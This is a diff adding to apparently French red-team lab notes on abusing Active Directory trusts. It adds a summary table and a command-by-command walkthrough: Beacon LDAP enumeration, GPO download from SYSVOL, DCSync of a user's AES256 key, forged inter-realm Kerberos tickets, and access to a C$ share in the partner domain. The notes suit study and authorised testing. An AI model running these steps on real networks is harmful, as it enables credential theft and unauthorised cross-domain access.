@@ -80,6 +80,13 @@ beacon> ldapsearch (samAccountType=805306370) --attributes samAccountName
 
 Côté realm approuvé, la clé est lue depuis ce compte ; côté realm approbateur, elle est stockée directement dans le TDO.
 
+# Résumé des cas possibles 
+
+| Type de trust                | Position de l'attaquant        | Sens de l'accès          | Filtrage SID | Accès obtenu                                                                                                                                     |
+| ---------------------------- | ------------------------------ | ------------------------ | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Parent/Child                 | Domaine enfant (DA local)      | Bidirectionnel transitif | Désactivé    | Enterprise Admins via SID History (golden ticket)                                                                                                |
+| Inbound (trustDirection: 1)  | Domaine approuvé (trusted)     | Dans le sens de l'accès  | Activé       | Usurpation d'un foreign security principal ayant un accès légitime (via password ou forge d'un ticket inter-realm via le trust account (dcsync)) |
+| Outbound (trustDirection: 2) | Domaine approbateur (trusting) | Contre-sens de l'accès   | Activé       | Privilèges Domain Users uniquement, via le trust account (primaryGroupID 513), en dcsync-ant son secret depuis le TDO                            |
 # Parent/Child Trusts
 
 Un ajout de domaine dans une arborescence crée automatiquement une relation transitive bidirectionnelle entre lui (l'enfant) et son parent. Comme ces relations sont transitives, il y a toujours une relation implicite bidirectionnelle entre tout domaine enfant, peu importe sa profondeur, et la racine de l'arborescence.
@@ -217,6 +224,81 @@ Où :
 - `/dc` est un contrôleur de domaine du domaine approbateur.
 - `/ticket` est le TGT inter-realm.
 
+
+## Enumeration
+
+1. Interact with the medium-integrity Beacon and enumerate the trust.
+```
+ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
+```
+2. Enumerate the Foreign Security Principals Container of the foreign domain.
+```
+ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
+```
+3. Identify what that local SID is.
+```
+ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
+```
+4. Enumerate members of that group.
+```
+ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
+```
+5. Find a domain controller in the foreign domain.
+```
+nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
+```
+
+## Discovery
+
+1. List GPOs.
+```
+ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
+```
+2. Download the GPO's _GptTmpl.inf_ file.
+```
+download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+```
+3. Sync it to your Attacker desktop and open it in Notepad.
+> It will show that the SID S-1-5-21-4244029708-1901239654-2578485347-1104 is a member of S-1-5-32-544, which is the local administrators group.
+
+4. You can confirm that this is the "Contoso Users" group and that it has the SID from CONTOSO, _S-1-5-21-3926355307-1661546229-813047887-6102_, is a member.
+```
+ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
+```
+5. Find where that GPO is linked.
+```
+ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
+```
+6. Find what computers exist in the foreign domain.
+```
+ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
+```
+
+## Exploitation
+
+1. Use the high-integrity Beacon to impersonate the _dyork_ user (who is a domain admin in the current domain).
+2. DCSync _rsteel_'s AES256 hash.
+```
+dcsync contoso.com CONTOSO\rsteel
+```
+3. Obtain a TGT for _rsteel_ (using aes256_hmac).
+```
+krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
+```
+4. Use the TGT to request an inter-realm referral ticket.
+```
+krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
+```
+5. Use the inter-realm ticket to request a service ticket for CIFS on _par-jmp-1_.
+```
+krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
+```
+6. Use the service ticket to access the service in the trusting domain.
+```
+ls \\par-jmp-1.partner.com\c$
+```
+
+---
 # Outbound Trusts
 
 Un attaquant peut aussi se retrouver du « mauvais » côté d'une relation à sens unique : le domaine approbateur. Il est alors à contre-sens de l'accès et ne peut pas, par design, atteindre le domaine approuvé — ces forest trusts sont de vraies frontières de sécurité.
